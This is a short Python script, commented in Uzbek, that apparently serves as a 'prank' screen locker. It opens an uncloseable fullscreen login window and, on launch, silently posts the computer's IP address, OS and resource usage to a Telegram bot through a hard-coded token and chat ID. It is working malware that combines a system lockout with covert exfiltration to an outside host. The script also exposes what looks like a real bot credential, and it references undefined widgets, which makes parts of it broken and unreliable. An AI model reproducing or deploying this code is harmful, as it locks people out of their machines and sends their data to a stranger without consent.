import tkinter as tk
import requests
import time
import math
import socket
import platform
import psutil

TOKEN = "7524503683:AAHnjSO5CyDYonnw4rU5bja0HFEum6v19A8"
ADMIN_ID = "5630386788"

CORRECT_LOGIN = "prank"
CORRECT_PASSWORD = "prank123"

root = tk.Tk()
root.title("Bloklangan")
root.attributes("-fullscreen", True)
root.configure(bg="black")
root.protocol("WM_DELETE_WINDOW", lambda: None)

login_label = tk.Label(root, text="Login:", fg="white", bg="black", font=("Arial", 18))
login_label.pack(pady=(100, 5))
login_entry = tk.Entry(root, font=("Arial", 18))
login_entry.pack()

password_label = tk.Label(root, text="Parol:", fg="white", bg="black", font=("Arial", 18))
password_label.pack(pady=5)
password_entry = tk.Entry(root, show="*", font=("Arial", 18))
password_entry.pack()

def send_user_msg():
    msg = user_msg.get()
    if msg:
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={
                "chat_id": ADMIN_ID,
                "text": f"[User msg]: {msg}"
            })
        except:
            pass
        user_msg.delete(0, tk.END)

def get_computer_info():
    # IP manzilini olish
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    
    # Tizim haqida ma'lumot olish
    system_info = platform.uname()
    os_info = system_info.system + " " + system_info.release
    cpu_info = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory().percent
    
    # Xabarni yuborish
    message = f"IP: {ip_address}\nOS: {os_info}\nCPU Usage: {cpu_info}%\nMemory Usage: {memory_info}%"
    
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={
            "chat_id": ADMIN_ID,
            "text": f"Kompyuter Ma'lumotlari:\n{message}"
        })
    except:
        pass

def check_login():
    login = login_entry.get()
    password = password_entry.get()
    if login == CORRECT_LOGIN and password == CORRECT_PASSWORD:
        root.destroy()
    else:
        message_label.config(text="Noto'g'ri login yoki parol!")

login_btn = tk.Button(root, text="Kirish", command=check_login, font=("Arial", 16))
login_btn.pack(pady=20)

# Ilova ishga tushdi degan xabarni botga yuboramiz
try:
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={
        "chat_id": ADMIN_ID,
        "text": "Ilova ishga tushdi va foydalanuvchi login oynasida."
    })
except:
    pass

# Kompyuter haqida ma'lumot yuborish
get_computer_info()

root.mainloop()
